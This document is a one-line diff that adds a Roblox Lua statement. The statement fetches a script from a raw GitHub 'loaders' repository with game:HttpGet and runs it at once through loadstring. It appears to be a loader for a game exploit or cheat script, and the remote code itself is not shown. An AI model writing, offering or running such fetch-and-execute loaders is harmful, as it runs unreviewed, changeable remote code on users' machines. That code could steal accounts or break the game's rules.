@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/slayers-2-spam3-gf7irbzwm4pkd2.lua"))()
